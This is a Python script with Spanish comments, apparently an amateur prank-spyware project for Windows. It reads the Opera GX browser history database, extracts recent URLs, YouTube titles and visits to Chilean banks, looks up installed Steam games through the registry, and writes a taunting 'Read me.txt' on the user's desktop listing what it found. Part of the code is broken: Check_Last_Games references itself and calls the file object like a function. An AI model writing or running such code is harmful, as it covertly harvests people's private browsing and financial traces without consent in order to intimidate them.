import os  # Módulo para interactuar con el sistema operativo (obtener rutas, usuario actual, etc.)
import re
from time import sleep  # Función para pausar la ejecución por un número determinado de segundos
from random import randrange  # Función para generar un número aleatorio dentro de un rango
import sqlite3
import winreg  # Módulo para interactuar con bases de datos SQLite

File_Name =  "Read me.txt"


def create_hacker_file(Desktop_Path):
    hacker_file = open(Desktop_Path + File_Name, "w")
    return hacker_file

def delay_action(n_seg):
    # # Generar un número aleatorio de segundos para dormir
    # n_seg = randrange(1, 10)
    print("Durmiendo {} segundos".format(n_seg))  # Imprimir el tiempo de espera
    sleep(n_seg)  # Pausar la ejecución por el número de segundos generado

def get_navegator_history(user_path):
    urls = None
    while not urls:
        try:
            # Ruta a la base de datos del historial de Opera GX
            History_Path =  user_path + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History"
            conection = sqlite3.connect(History_Path)  # Crear una conexión a la base de datos
            cursor = conection.cursor()  # Crear un cursor para ejecutar consultas SQL

            # Consulta SQL: Obtener la última página visitada, ordenada por tiempo de visita descendente
            cursor.execute("SELECT title, url, last_visit_time FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()  # Obtener el primer resultado de la consulta
            conection.close()
            return urls 

        except sqlite3.OperationalError:
            delay_action(3)

def index_desktop(desktop_paths):
    for path in desktop_paths:
        if os.path.exists(path):
            return path
    
    return -1  # Retorna -1 si no se encuentra ninguna ruta válida

def Check_Hack_file(User_Name, Hacker_file, Navegator_History):
    Hacker_file.write("Hola {} \nVeo que has estado visitando paginas como:\n\n".format(User_Name))

    for item in Navegator_History[:5]: #Revisar del 0 al 5
            Hacker_file.write("- " + item[1] + "\n")
    
def Check_history_youtube(Hacker_file, Navegator_History):
    Hacker_file.write("\n\nIgualmente, has visto algunos videos: \n")

    Video_Titles = []
    for item in Navegator_History:
        results = re.findall(r"https://www.youtube\.com/watch\?v=[A-Za-z0-9_-]+", item[1])
        if results:
            #print(item[0])
            Video_Titles.append(item[0])

        if len(Video_Titles) > 10:
            break

    for title in Video_Titles:
        # Eliminar caracteres Unicode no representables
        sanitized_title = title.encode("ascii", "ignore").decode("ascii")
        Hacker_file.write("- {}\n".format(sanitized_title))

def Check_Bank_Account(Hacker_file, Navegator_History):
    banks = ["Banco de Chile", "Banco Santander", "Banco BCI (Banco de Crédito e Inversiones)", 
        "Banco Estado", "Banco Itaú", "Banco Scotiabank", "Banco Falabella", "Banco Ripley", "Banco BICE", "Banco Coopeuch"]
    visited_banks = []  # Lista para almacenar los bancos visitados

    for item in Navegator_History:
        for b in banks:
            if b.lower() in item[0].lower():  # Buscar en minúsculas
                if b not in visited_banks:  # Evitar duplicados
                    visited_banks.append(b)

    if visited_banks:  # Si se encontraron bancos visitados
        Hacker_file.write("\nEn conjunto a esto, también sé que has visitado el")
        for i, bank in enumerate(visited_banks):
            if i == 0:
                Hacker_file.write(f" el {bank}")
            elif i == len(visited_banks) -1 :
                Hacker_file.write(f", y el {bank}.\n")
            else:
                Hacker_file.write(f", el {bank}")

# Función para obtener la ruta de instalación de Steam desde el registro de Windows
def Steam_Path():
    try:
        # Accede al registro de Windows para obtener la ruta de instalación de Steam
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Valve\Steam")
        install_path, _ = winreg.QueryValueEx(reg_key, "SteamPath")
        winreg.CloseKey(reg_key)
        return install_path
    except FileNotFoundError:
        print("No se encontró Steam en el registro.")
        return None

def Chek_Steam_Games():
    steam_path = Steam_Path()
    if steam_path:
        # Construir la ruta a la carpeta de juegos
        games_path = os.path.join(steam_path, "steamapps", "common")
        if os.path.exists(games_path):
            games = os.listdir(games_path)
            # Filtrar los juegos cuyo nombre contiene "steam"
            games = [game for game in games if 'steam' not in game.lower()]
            games = sorted(games, key=lambda game: os.path.getmtime(os.path.join(games_path, game)), reverse=True)

            print("Juegos encontrados en Steam:")
            return games
        else:
            print("No se encontró la carpeta 'common' en la ruta de Steam.")
            return None
    else:
        print("No se pudo obtener la ruta de Steam.")
        return None


def Check_Last_Games(Hacker_file):
    games = Check_Last_Games
    Hacker_file(f"Estuve viendo que jugaste ultimamente {games[0]} y {games[1]}.")


def main(): 
    
    # Obtener el nombre de usuario del sistema operativo
    User_Name =  os.getlogin()
    User_PATH = "C:\\Users\\" + User_Name

    Desktop_paths = [User_PATH + "\\Desktop\\",User_PATH +"\\OneDrive\\Escritorio\\", User_PATH + "\\Escritorio\\"] 
    Desktop_Path = index_desktop(Desktop_paths)#Calculamos ruta path desktop
    # delay_action(3) #Esperamos x time

    Navegator_History = get_navegator_history(User_PATH)
    Hacker_file = create_hacker_file(Desktop_Path)

    Check_Hack_file(User_Name, Hacker_file, Navegator_History)
    Check_history_youtube(Hacker_file, Navegator_History)
    Check_Bank_Account(Hacker_file, Navegator_History)
    Check_Last_Games(Hacker_file)

    

# Comprobar si el script está siendo ejecutado directamente
if __name__ == "__main__":
    main()  # Ejecutar la función principal si el archivo es ejecutado directamente




# # Modo A: Crear o sobrescribir un archivo de texto en el escritorio
#     archivo = open(Desktop_Path + "For you.txt", "w")  # Abrir el archivo en modo escritura ("w")
#     archivo.write("Simplemente, practico para decirte adiós.")  # Escribir contenido en el archivo
#     archivo.close()  # Cerrar el archivo después de escribir



    # # Modo B: Crear otro archivo en el escritorio y escribir contenido en él
    #     with open(desktop_path + "Holalalala.txt", "w") as hello_file:
    #         hello_file.write("Estoy viendo los sopranos,")  # Escribir contenido en el archivo
    #         # Nota: `close` no es necesario en este caso porque `with` cierra automáticamente el archivo
